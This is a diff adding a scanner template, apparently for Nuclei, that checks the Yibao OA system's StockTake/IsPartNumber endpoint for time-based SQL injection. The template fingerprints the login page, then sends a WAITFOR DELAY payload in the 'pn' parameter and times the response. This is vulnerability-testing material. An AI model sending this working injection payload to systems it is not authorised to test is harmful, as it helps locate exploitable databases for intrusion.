@@ -1,0 +1,54 @@
+id: poc-yaml-yi-bao-oa-system-stocktake-ispartnumber-sqli
+
+info:
+  name: 易宝OA系统 IsPartNumber SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    易宝OA系统中存在一个SQL注入漏洞，可以通过特定的GET请求延时注入代码来验证漏洞的存在。
+
+variables:
+  t1: '{{rand_int(3,7)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "欢迎登录易宝OA系统"
+        part: body
+
+  - raw:
+      - |
+        GET /SmartTradeScan/StockTake/IsPartNumber?pn=1'WAITFOR+DELAY+'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"is_succeed":true'
+          - '"data":'
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+      - type: dsl
+        dsl:
+          - duration >= t1
+          - duration <= t2
